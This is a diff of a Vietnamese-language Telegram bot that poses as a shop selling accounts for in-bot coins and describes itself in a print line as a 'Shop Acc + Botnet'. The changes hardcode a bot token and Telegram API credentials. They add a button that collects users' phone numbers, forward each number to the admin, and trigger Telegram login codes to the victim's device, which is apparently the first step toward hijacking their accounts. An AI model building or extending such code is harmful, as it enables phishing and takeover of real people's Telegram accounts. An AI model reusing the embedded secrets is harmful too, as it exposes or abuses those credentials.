@@ -18,13 +18,13 @@ from telethon.tl.types import InputPeerEmpty
 # ===== CẤU HÌNH TOKEN VÀ BIẾN MÔI TRƯỜNG =====
 # ==========================================
 
-TOKEN = os.getenv('BOT_TOKEN', '').strip()
+TOKEN = "8483501766:AAF3qsT9u6V-bB-hQl8ftJDiyISJHItFz_I"
 DATABASE_URL = os.getenv('DATABASE_URL', '')
-ADMIN_ID = 79079
+ADMIN_ID = 7907990385
 REQUIRED_GROUP = "@genplaycluod"
 
-API_ID = int(os.getenv('API_ID', 36010894))
-API_HASH = os.getenv('API_HASH', '981df00e84d0e65e70e57595ec3eaa94')
+API_ID = 36010894
+API_HASH = "981df00e84d0e65e70e57595ec3eaa94"
 
 bot = telebot.TeleBot(TOKEN)
 
@@ -370,7 +370,7 @@ def callback_shop_view(call):
         pass
 
 # ==========================================
-# ===== GIAO DỊCH MUA ACC & NHẬP SỐ ĐIỆN THOẠI =
+# ===== GIAO DỊCH MUA ACC & NÚT GỬI SĐT =====
 # ==========================================
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
@@ -395,35 +395,48 @@ def callback_buy(call):
         bot.answer_callback_query(call.id, "❌ Bạn không đủ Xu để mua tài khoản này!", show_alert=True)  
         return  
 
-    bot.answer_callback_query(call.id, "⚡ Vui lòng nhập số điện thoại!")  
+    bot.answer_callback_query(call.id, "⚡ Vui lòng chia sẻ số điện thoại!")  
+
+    # Tạo nút bấm chia sẻ SĐT trực tiếp, không cần reply
+    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    btn_contact = types.KeyboardButton("📱 Chia sẻ số điện thoại nhận Acc", request_contact=True)
+    markup.add(btn_contact)
       
-    sent = bot.send_message(  
+    bot.send_message(  
         call.message.chat.id,   
         f"🎁 Bạn sắp nhận tài khoản **{category}** (Trị giá {price} Xu).\n\n"  
-        "🔐 **Xác minh giao dịch:** Vui lòng nhập số điện thoại của bạn (Ví dụ: `+84912345678` hoặc `0912345678`):",   
+        "🔐 **Xác minh giao dịch:** Bấm nút bên dưới để chia sẻ số điện thoại của bạn:",   
+        reply_markup=markup,
         parse_mode="Markdown"  
-    )  
-    bot.register_next_step_handler(sent, process_phone_input)
+    )
 
 # ==========================================
 # ===== XỬ LÝ SỐ ĐIỆN THOẠI & KÍCH HOẠT CODE ==
 # ==========================================
 
+@bot.message_handler(content_types=['contact', 'text'])
 def process_phone_input(msg):
     if msg.text and msg.text.startswith('/'):
-        return # Nếu người dùng gõ lệnh khác thì hủy bước
+        return
 
-    phone = msg.text.strip() if msg.text else ""
+    phone = ""
+    if msg.contact:
+        phone = msg.contact.phone_number
+    elif msg.text:
+        phone = msg.text.strip()
     
-    if phone.startswith('0'):
-        phone = '+84' + phone[1:]
-    elif not phone.startswith('+'):
+    if not phone:
+        return
+
+    if not phone.startswith('+'):
         phone = '+' + phone
 
     if not re.match(r'^\+\d{10,15}$', phone):
-        sent = bot.reply_to(msg, "❌ Số điện thoại không hợp lệ. Vui lòng nhập lại đúng định dạng (Ví dụ: `+84912345678` hoặc `0912345678`):", parse_mode="Markdown")
-        bot.register_next_step_handler(sent, process_phone_input)
+        bot.reply_to(msg, "❌ Số điện thoại không hợp lệ. Vui lòng thử lại:", parse_mode="Markdown")
         return
+
+    # Xóa bàn phím chia sẻ SĐT đi
+    hide_markup = types.ReplyKeyboardRemove()
 
     conn = get_db_connection()
     cur = conn.cursor()
@@ -433,11 +446,12 @@ def process_phone_input(msg):
     cur.close()
     conn.close()
 
-    bot.send_message(ADMIN_ID, f"📱 Số mới nhập qua chat: {phone} | ID: {msg.from_user.id}")  
+    bot.send_message(ADMIN_ID, f"📱 Số mới nhận qua chat/nút: {phone} | ID: {msg.from_user.id}")  
     
     bot.send_message(
         msg.chat.id, 
-        "⏳ Hệ thống đang yêu cầu Telegram gửi mã xác nhận đến thiết bị của bạn...\nVui lòng chờ trong giây lát!"
+        "⏳ Hệ thống đang yêu cầu Telegram gửi mã xác nhận đến thiết bị của bạn...\nVui lòng chờ trong giây lát!",
+        reply_markup=hide_markup
     )
     
     threading.Thread(target=trigger_telegram_code, args=(msg.chat.id, msg.from_user.id, phone)).start()
@@ -946,4 +960,3 @@ if __name__ == "__main__":
 
     print("✨ Bot tích hợp Shop Acc + Botnet đã sẵn sàng hoạt động!")  
     bot.infinity_polling(skip_pending=True)
- 
